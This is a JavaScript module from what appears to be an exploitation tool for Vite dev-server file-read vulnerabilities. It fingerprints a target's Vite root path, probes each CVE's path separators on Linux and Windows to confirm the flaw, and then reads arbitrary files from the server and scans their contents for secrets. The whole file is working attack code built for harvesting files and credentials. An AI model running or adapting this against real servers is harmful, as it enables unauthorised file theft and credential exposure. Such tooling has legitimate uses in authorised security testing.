'use strict';

const http = require('./httpClient');
const { resolveCve, probeFor } = require('./payloads');
const { scanContent } = require('./secretScanner');

const VITE_CLIENT_RE =
  /<script type="module" src="(?:https?:\/\/[^/]+)?(.*?)\/@vite\/client"/;

/**
 * Fetch the target index page and extract:
 *   - `alive`    : whether the base URL responded.
 *   - `rootPath` : the Vite base/root path prefix (from the /@vite/client tag).
 *   - `isVite`   : whether the page references the Vite client at all.
 */
async function fingerprint(target, opts = {}) {
  const res = await http.get(target.url, opts);
  if (!res.ok) {
    return { alive: false, isVite: false, rootPath: '', status: 0, error: res.error };
  }
  const m = res.body.match(VITE_CLIENT_RE);
  const rootPath = m && m[1] ? m[1] : '';
  return {
    alive: true,
    isVite: /@vite\/client/.test(res.body),
    rootPath,
    status: res.status,
  };
}

/**
 * Build the full exploit URL for a given CVE, separator, root path and file.
 */
function buildExploitUrl(target, cve, sep, rootPath, filePath) {
  return `${target.url}${rootPath}${sep}${cve.buildPath(filePath)}`;
}

/**
 * Verify whether a target is vulnerable to the given CVE. Tries each separator
 * and both platform probes. Returns the first positive result.
 *
 * @returns {Promise<{vulnerable:boolean, platform?:string, separator?:string,
 *                     rootPath?:string, cve:string, evidenceUrl?:string,
 *                     error?:string}>}
 */
async function verify(target, cveIdOrAlias, opts = {}) {
  const cve = resolveCve(cveIdOrAlias);
  if (!cve) return { vulnerable: false, cve: cveIdOrAlias, error: 'unknown CVE' };

  const fp = await fingerprint(target, opts);
  if (!fp.alive) {
    return { vulnerable: false, cve: cve.id, error: fp.error || 'target unreachable' };
  }
  const rootPath = fp.rootPath || '';

  for (const sep of cve.separators) {
    for (const platform of ['linux', 'windows']) {
      const probe = probeFor(platform);
      const url = buildExploitUrl(target, cve, sep, rootPath, probe);
      const res = await http.get(url, opts);
      if (res.ok && cve.detect(res.body)) {
        return {
          vulnerable: true,
          platform,
          separator: sep,
          rootPath,
          cve: cve.id,
          evidenceUrl: url,
        };
      }
    }
  }
  return { vulnerable: false, cve: cve.id, rootPath, isVite: fp.isVite };
}

/**
 * Attempt to read a single file from a confirmed-vulnerable target using a
 * previously discovered CVE/separator/rootPath. Returns the decoded content
 * plus any secret findings.
 *
 * @returns {Promise<{ok:boolean, path:string, url:string, content?:string,
 *                     size?:number, secrets?:Array, error?:string}>}
 */
async function readFile(target, cveIdOrAlias, filePath, exploit, opts = {}) {
  const cve = resolveCve(cveIdOrAlias);
  if (!cve) return { ok: false, path: filePath, url: '', error: 'unknown CVE' };

  const sep = exploit && exploit.separator !== undefined ? exploit.separator : '';
  const rootPath = exploit && exploit.rootPath ? exploit.rootPath : '';
  const normalized = String(filePath).replace(/\\/g, '/');
  const url = buildExploitUrl(target, cve, sep, rootPath, normalized);

  const res = await http.get(url, opts);
  if (!res.ok) {
    return { ok: false, path: normalized, url, error: res.error };
  }
  if (!cve.detect(res.body)) {
    return { ok: false, path: normalized, url, error: 'not readable / not vulnerable at this path' };
  }
  const content = cve.extract(res.body);
  if (content === null) {
    return { ok: false, path: normalized, url, error: 'failed to parse module wrapper' };
  }
  return {
    ok: true,
    path: normalized,
    url,
    content,
    size: content.length,
    secrets: scanContent(content),
  };
}

module.exports = { fingerprint, verify, readFile, buildExploitUrl };
